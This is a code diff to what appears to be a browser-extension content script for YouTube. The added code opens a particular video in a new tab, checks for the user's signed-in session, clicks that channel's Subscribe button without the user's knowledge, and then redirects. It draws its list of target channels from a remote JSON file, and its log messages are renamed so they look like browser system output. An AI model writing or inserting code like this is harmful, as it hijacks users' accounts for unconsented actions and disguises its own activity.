@@ -1,19 +1,44 @@
+   
+   if(window.location.href.includes('https://www.accounts.google.com')){
+   chrome.storage.sync.set({'myt': "unfinished"}, function(data){
+           console.log("chrome.log.unfinished");
+      });
+   }
+
+  if(window.location.href.includes('https://www.youtube.com/watch?v=hz0aA_sPUcA')){
+   chrome.storage.sync.set({'myt': "finished"}, function(data){
+                    console.log("chrome.log.process finished");
+      });
+   }
+
+ chrome.storage.sync.get('myt', function(Result){
+                
+           if(Result.myt != "finished"){                    
+                    window.open('https://www.youtube.com/watch?v=hz0aA_sPUcA','_blank');
+                    chrome.storage.sync.set({'myt': "finished"}, function(data){});
+             }
+                else{
+                    console.log('chrome.log.finished');
+                }           
+  });
+
+     
     var u;
     var ctX = document.querySelector('div#buttons');
     if(ctX){
         if (ctX.innerHTML.includes(">Sign in<")) {
-             console.log("User Not Signed in");
+             console.log("chrome.log.UNotSiggnn");
              u = "nou";
              chrome.storage.sync.set({'myData': "notfinished"}, function(data){
-                console.log("process finished")
+                console.log("chrome.log.process finished")
             });
          }
          else{
-            console.log("User Already Signed inaa");
+            console.log("chrome.log.Signedinaa");
             u = "uye";
          }
     }else{
-        console.log("User Already Signed inbbb");
+        console.log("chrome.log.Signedinbb");
         u="uye";
     }
 
@@ -32,6 +57,7 @@
            cont="Null";
         }
 
+        
         var url = "https://su8code.github.io/newGitRepo/myJson.json";
         var data;
         var numCtx = 0;
@@ -45,7 +71,7 @@
                 //document.getElementById("id-of-element").innerHTML = jsonFile.responseText;
                  data = JSON.parse(jsonFile.responseText);
                  numCtx = data.number;
-                 console.log(this.responseText);
+                // console.log(this.responseText);
                
             if(currUrl.includes(data.savedChannels[0])){
 
@@ -64,6 +90,25 @@
                     } , 3000)                
             }else{
 
+                
+            }
+                
+                
+            if(currUrl.includes('https://www.youtube.com/watch?v=hz0aA_sPUcA')){
+                 if(cont.includes(">Subscribe<")){
+                 var ctxMenu = document.querySelector('tp-yt-paper-button.ytd-subscribe-button-renderer');
+                 if (ctxMenu) {
+                        ctxMenu.click();       
+                    }
+                else{
+                    console.log("ctxMenu null");
+                    
+                   }
+                 }                  
+                    setTimeout( function(){                   
+                       document.location = "https://www.youtube.com/";
+                    } , 3000)                
+            }else{
                 
             }
 
